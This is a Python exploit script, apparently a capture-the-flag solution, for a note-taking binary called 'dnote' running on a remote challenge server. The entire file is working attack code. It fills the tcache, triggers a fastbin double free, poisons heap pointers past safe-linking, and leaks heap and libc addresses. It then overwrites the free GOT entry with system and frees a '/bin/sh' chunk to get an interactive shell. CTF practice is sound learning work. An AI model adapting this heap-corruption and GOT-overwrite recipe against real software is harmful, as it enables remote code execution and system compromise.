#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./dnote')
host = args.HOST or 'chall.nitdgplug.org'
port = int(args.PORT or 30094)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def cmd(choice):
	sla(b">> ", str(choice).encode('latin-1'))

def add(idx, size, data):
	cmd(1)
	sla(b"Page no : ", str(idx).encode('latin-1') )
	sla(b"Name size : ", str(size).encode('latin-1') )
	sla(b"Enter Name : ", data)

def show(idx):
	cmd(2)
	sla(b"Page no : ", str(idx).encode('latin-1') )
	return rl()

def delete(idx):
	cmd(3)
	sla(b"Page no : ", str(idx).encode('latin-1') )

libc=SetupLibcELF()
io = start()

for i in range(9):
	add(i, 0x78, b"A"*0x78)

for i in range(7):
	delete(6-i)

delete(8) # chunk B

heap_base=uu64(show(6))<<12
hb()

delete(7) # chunk A
delete(8) # fastbin dup chunk A & B is in fastbin

notes=0x4040c0

for i in range(9, 19):
	add(i, 0x78, p(notes^(heap_base>>12)))  # overwrite fd 

add(19, 0x78, p(exe.got['free']).ljust(0x78-8, b'\x00') ) # write what where primitive. overwrite notes[0] with free got to leak libc. null out some other notes. not necessary anyways. 

libc.address=uu64(show(0))-libc.sym['free']
lb()

for i in range(9):
	add(i, 0x68, b"A"*0x68)

for i in range(7):
	delete(6-i)

delete(8) # chunk B
delete(7) # chunk A
delete(8) # fast bin dup

for i in range(9, 19):
	add(i, 0x68, p(exe.got.free-8^(heap_base>>12))) # overwrite fd

add(19, 0x68, p(0xdeadbeef) + p(libc.sym.system) ) # write what where primitive. overwrite free with system
add(20, 32, b"/bin/sh\x00") # pepega
delete(20)

io.interactive()
